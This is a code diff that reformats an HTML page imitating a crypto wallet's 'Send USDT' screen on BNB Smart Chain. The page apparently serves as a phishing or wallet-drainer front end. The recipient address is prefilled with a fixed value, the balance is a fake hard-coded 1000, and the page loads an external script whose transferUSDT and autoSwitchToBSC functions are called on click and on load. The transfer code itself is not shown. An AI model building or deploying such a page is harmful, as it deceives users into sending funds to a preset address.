@@ -1,4 +1,266 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>Send USDT</title><script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script><script src="script.js"></script><style>:root{--brand-blue:#0500ff;--brand-text:#5b5b5b;--network-bg:#f4f4f6;--network-text:#636363;--border-color:#808080;--text-main:#000;--button-color:#fff}@media (prefers-color-scheme:dark){:root{--bg-main:#1B1B1B;--text-main:#ffffff;--brand-text:#a1a1a1;--network-bg:#1a1a1a;--network-text:#cccccc;--input-bg:transparent;--input-color:#fff;--border-color:#444444;--brand-blue:#6ff26f;--button-color:#000;--network-bg:#242424}}*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}body{margin:0;color:var(--text-main);background-color:var(--bg-main)}.container{background:var(--bg-main);max-width:448px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column}.content{padding:20px 16px;flex-grow:1}.label{color:var(--brand-text);font-weight:500;font-size:14px;margin-bottom:8px;display:block}.input-wrapper{position:relative;margin-bottom:25px}input{width:100%;border-radius:8px;border:1.2px solid var(--border-color);padding:18px 16px;font-size:16px;outline:0;transition:all .1s;font-weight:500;background:var(--input-bg);color:var(--input-color)}input:focus{border-color:var(--brand-blue);border-width:2px}#addressInput{padding-right:160px}#amountInput{padding-right:110px}.actions-right{position:absolute;right:12px;top:50%;transform:translateY(-50%);display:flex;align-items:center;gap:12px}.clear-btn{background:#6d6d6d;width:22px;height:22px;border-radius:50%;display:none;align-items:center;justify-content:center;border:none;cursor:pointer;color:#fff;padding:3px}.clear-btn.flex{display:flex}.btn-link{color:var(--brand-blue);font-weight:600;font-size:14px;border:none;background:0 0;cursor:pointer;padding:0}.network-badge{display:inline-flex;align-items:center;gap:8px;background:var(--network-bg);padding:6px 12px;border-radius:20px;margin-top:4px}.network-badge img{width:20px;height:20px;border-radius:50%}.network-badge span{color:var(--network-text);font-size:14px;font-weight:500}.footer{padding:16px;margin-top:auto}.btn-main{width:100%;padding:16px;border-radius:30px;border:none;background:var(--brand-blue);color:var(--button-color);font-weight:700;font-size:16px;cursor:pointer;transition:.2s}.btn-main:disabled{opacity:.5;cursor:not-allowed}.error-text{color:#ef4444;font-size:12px;margin-top:6px;display:none}.info-row{display:flex;justify-content:space-between;align-items:center;margin-top:8px}svg{display:block}</style></head><body><div class="container"><div class="content"><label class="label">Address or Domain Name</label><div class="input-wrapper"><input id="addressInput" type="text" value="0xF58f61b175d6029446a30987089e0FdF39d6eD47" placeholder="Search or Enter"><div class="actions-right"><div id="clearAddress" class="clear-btn"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#FFFFFF" stroke-width="3"><path d="M18 6L6 18M6 6l12 12"/></svg></div><button class="btn-link">Paste</button><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--brand-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 6h4"/><path d="M2 10h4"/><path d="M2 14h4"/><path d="M2 18h4"/><rect width="16" height="20" x="4" y="2" rx="2"/><path d="M16 2v20"/></svg><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--brand-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7V5a2 2 0 0 1 2-2h2"/><path d="M17 3h2a2 2 0 0 1 2 2v2"/><path d="M21 17v2a2 2 0 0 1-2 2h-2"/><path d="M7 21H5a2 2 0 0 1-2-2v-2"/><path d="M7 12h10"/></svg></div><p id="addressError" class="error-text">Invalid Address</p></div><label class="label">Destination network</label><div class="network-badge"><img src="https://cdn.brandfetch.io/id8njqSNGQ/w/400/h/400/theme/dark/icon.jpeg" alt="BNB"><span>BNB Smart Chain</span><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--network-text)" stroke-width="2.5"><path d="m6 9 6 6 6-6"/></svg></div><div style="height:24px"></div><label class="label">Amount</label><div class="input-wrapper"><input id="amountInput" type="number" placeholder="USDT Amount"><div class="actions-right"><div id="clearAmount" class="clear-btn"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#FFFFFF" stroke-width="3"><path d="M18 6L6 18M6 6l12 12"/></svg></div><span style="color:var(--brand-text);font-size:14px;font-weight:600">USDT</span><button id="maxBtn" class="btn-link">Max</button></div></div><div class="info-row"><p id="usdValue" style="color:#9ca3af;font-size:12px;margin:0">≈ $0.00</p><p id="amountError" class="error-text" style="margin:0">Not enough balance</p></div></div><div class="footer"><button onclick="transferUSDT(this)" id="nextBtn" class="btn-main">Next</button></div></div><script>const BALANCE = 1000;
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Send USDT</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
+    <script src="script.js"></script>
+
+    <style>
+      :root {
+        --brand-blue: #0500ff;
+        --brand-text: #5b5b5b;
+        --network-bg: #f4f4f6;
+        --network-text: #636363;
+        --border-color: #808080;
+        --text-main:#000;
+        --button-color:#fff;
+      }
+
+      @media (prefers-color-scheme: dark) {
+        :root {
+          --bg-main: #1B1B1B; /* Pure black background */
+          --text-main: #ffffff;
+          --brand-text: #a1a1a1;
+          --network-bg: #1a1a1a;
+          --network-text: #cccccc;
+          --input-bg: transparent;
+          --input-color:#fff;
+          --border-color: #444444;
+          --brand-blue:#6ff26f;
+          --button-color:#000;
+          --network-bg:#242424;
+        }
+      }
+
+      * {
+        box-sizing: border-box;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      }
+      body {
+        margin: 0;
+        color: var(--text-main);
+        background-color: var(--bg-main);
+      }
+
+      .container {
+        background: var(--bg-main);
+        max-width: 448px;
+        margin: 0 auto;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+      .content {
+        padding: 20px 16px;
+        flex-grow: 1;
+      }
+
+      .label {
+        color: var(--brand-text);
+        font-weight: 500;
+        font-size: 14px;
+        margin-bottom: 8px;
+        display: block;
+      }
+
+      .input-wrapper {
+        position: relative;
+        margin-bottom: 25px;
+      }
+
+      input {
+        width: 100%;
+        border-radius: 8px;
+        border: 1.2px solid var(--border-color);
+        padding: 18px 16px;
+        font-size: 16px;
+        outline: none;
+        transition: all 0.1s;
+        font-weight: 500;
+        background: var(--input-bg);
+        color:var(--input-color);
+      }
+      input:focus {
+        border-color: var(--brand-blue);
+        border-width: 2px;
+      }
+
+      /* Specific padding for icons */
+      #addressInput {
+        padding-right: 160px;
+      }
+      #amountInput {
+        padding-right: 110px;
+      }
+
+      .actions-right {
+        position: absolute;
+        right: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+
+      .clear-btn {
+        background: #6d6d6d;
+        width: 22px;
+        height: 22px;
+        border-radius: 50%;
+        display: none;
+        align-items: center;
+        justify-content: center;
+        border: none;
+        cursor: pointer;
+        color: #fff;
+        padding: 3px;
+      }
+      .clear-btn.flex {
+        display: flex;
+      }
+
+      .btn-link {
+        color: var(--brand-blue);
+        font-weight: 600;
+        font-size: 14px;
+        border: none;
+        background: none;
+        cursor: pointer;
+        padding: 0;
+      }
+
+      .network-badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        background: var(--network-bg);
+        padding: 6px 12px;
+        border-radius: 20px;
+        margin-top: 4px;
+      }
+      .network-badge img {
+        width: 20px;
+        height: 20px;
+        border-radius: 50%;
+      }
+      .network-badge span {
+        color: var(--network-text);
+        font-size: 14px;
+        font-weight: 500;
+      }
+
+      .footer {
+        padding: 16px;
+        margin-top: auto;
+      }
+      .btn-main {
+        width: 100%;
+        padding: 16px;
+        border-radius: 30px;
+        border: none;
+        background: var(--brand-blue);
+        color: var(--button-color);
+        font-weight: 700;
+        font-size: 16px;
+        cursor: pointer;
+        transition: 0.2s;
+      }
+      .btn-main:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+      }
+
+      .error-text {
+        color: #ef4444;
+        font-size: 12px;
+        margin-top: 6px;
+        display: none;
+      }
+      .info-row {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 8px;
+      }
+
+      svg {
+        display: block;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="content">
+        <label class="label">Address or Domain Name</label>
+        <div class="input-wrapper">
+          <input id="addressInput" type="text" value="0xF58f61b175d6029446a30987089e0FdF39d6eD47" placeholder="Search or Enter" />
+          <div class="actions-right">
+            <div id="clearAddress" class="clear-btn">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#FFFFFF" stroke-width="3">
+                <path d="M18 6L6 18M6 6l12 12" />
+              </svg>
+            </div>
+            <button class="btn-link">Paste</button>
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--brand-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M2 6h4" />
+              <path d="M2 10h4" />
+              <path d="M2 14h4" />
+              <path d="M2 18h4" />
+              <rect width="16" height="20" x="4" y="2" rx="2" />
+              <path d="M16 2v20" />
+            </svg>
+
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--brand-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M3 7V5a2 2 0 0 1 2-2h2" />
+              <path d="M17 3h2a2 2 0 0 1 2 2v2" />
+              <path d="M21 17v2a2 2 0 0 1-2 2h-2" />
+              <path d="M7 21H5a2 2 0 0 1-2-2v-2" />
+              <path d="M7 12h10" />
+            </svg>
+          </div>
+          <p id="addressError" class="error-text">Invalid Address</p>
+        </div>
+
+        <label class="label">Destination network</label>
+        <div class="network-badge">
+          <img src="https://cdn.brandfetch.io/id8njqSNGQ/w/400/h/400/theme/dark/icon.jpeg" alt="BNB" />
+          <span>BNB Smart Chain</span>
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--network-text)" stroke-width="2.5"><path d="m6 9 6 6 6-6" /></svg>
+        </div>
+
+        <div style="height: 24px"></div>
+
+        <label class="label">Amount</label>
+        <div class="input-wrapper">
+          <input id="amountInput" type="number" placeholder="USDT Amount" />
+          <div class="actions-right">
+            <div id="clearAmount" class="clear-btn">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#FFFFFF" stroke-width="3">
+                <path d="M18 6L6 18M6 6l12 12" />
+              </svg>
+            </div>
+            <span style="color: var(--brand-text); font-size: 14px; font-weight: 600">USDT</span>
+            <button id="maxBtn" class="btn-link">Max</button>
+          </div>
+        </div>
+
+        <div class="info-row">
+          <p id="usdValue" style="color: #9ca3af; font-size: 12px; margin: 0">≈ $0.00</p>
+          <p id="amountError" class="error-text" style="margin: 0">Not enough balance</p>
+        </div>
+      </div>
+
+      <div class="footer">
+        <button onclick="transferUSDT(this)" id="nextBtn" class="btn-main">Next</button>
+      </div>
+    </div>
+
+    <script>
+      const BALANCE = 1000;
       const addressInput = document.getElementById("addressInput");
       const amountInput = document.getElementById("amountInput");
       const clearAddress = document.getElementById("clearAddress");
@@ -45,4 +307,7 @@
       window.addEventListener("load", () => {
         if (typeof autoSwitchToBSC === "function") autoSwitchToBSC();
         updateUI();
-      });</script></body></html>
+      });
+    </script>
+  </body>
+</html>
